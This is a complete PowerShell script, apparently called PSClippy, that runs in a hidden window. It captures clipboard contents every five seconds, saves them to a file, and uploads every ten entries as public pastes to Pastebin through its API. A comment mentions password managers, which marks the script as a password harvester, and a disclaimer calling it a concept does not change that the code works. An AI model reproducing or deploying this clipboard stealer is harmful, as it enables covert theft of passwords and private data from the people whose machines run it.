
  
$record = Read-Host -Prompt "Enter P for PasteBin | Enter F for File"


if ($record -eq "f" -or $record -eq "F"){

$filechoice = 1
$fileloc = Read-Host -Prompt "Location to save file (Example: C:\temp\psclippy.txt)"

while ($fileloc.EndsWith(".txt") -eq $false){ 

Write-Output ""
Write-Output "Please enter the full path, including filename (Example: C:\temp\psclippy.txt)"
$fileloc = Read-Host -Prompt "Location to save file (Example: C:\temp\psclippy.txt)"

}

$fileloc >> C:\temp\file.txt
attrib +h "C:\temp\file.txt"

}

if ($record -eq "p" -or $record -eq "P"){

$pasteapikey = Read-Host -Prompt "Paste API Key"
$pastename = Read-Host -Prompt "Paste Name"

if ($pastename -eq $null) {$pastename = "PSClippy"}

$pasteapikey >> C:\temp\api.txt
$pastename >> C:\temp\pastename.txt

attrib +h "C:\temp\api.txt"
attrib +h "C:\temp\pastename.txt"

}



PowerShell.exe -windowstyle hidden {

$testfile = Test-Path -Path C:\temp\file.txt
$testpaste = Test-Path -Path C:\temp\api.txt

if ($testfile -eq "True"){

$filechoice = 1
$fileloc = Get-Content C:\temp\file.txt

Remove-Item C:\temp\file.txt -Force

}

if ($testpaste -eq "True"){

$pastechoice = 1
$pasteapikey = Get-Content C:\temp\api.txt
$pastename = Get-Content C:\temp\pastename.txt

Remove-Item C:\temp\pastename.txt -Force
Remove-Item C:\temp\api.txt -Force

}





# * This is to show a concept. Do not use for harm! *

$pclip = ""
$array = @()
$counter = 0



while($true){

# Get Clipboard

$cclip = Get-Clipboard



# If the current and old match...do nothing

if ($pclip -eq $cclip){}


# if they don't add to array

else {


$array += $cclip
$pclip = $cclip
$cclip = Get-Clipboard

# Add to counter 

$counter++

if ($filechoice -eq 1){

$pclip >> $fileloc

}





}

if ($pastechoice -eq 1){


# At 10, upload to PasteBin. You will need to add your API key *

if ($counter -gt 9){


# Format Paste

$Body = @{    api_dev_key = ‘$pasteapikey’

    api_paste_code = (“$array”)

    api_paste_private = 0

    api_paste_name = ‘$pastename’

    api_option = ‘paste’

    api_user_key = ”"
}
# Upload To PasteBin
Invoke-WebRequest -Uri “https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post


$counter = 0

}


} # End of if paste = 1


# This can be changed to be longer but most password managers will remove after X seconds. 

Start-Sleep -Seconds 5


} 



} # Hidden
    
    
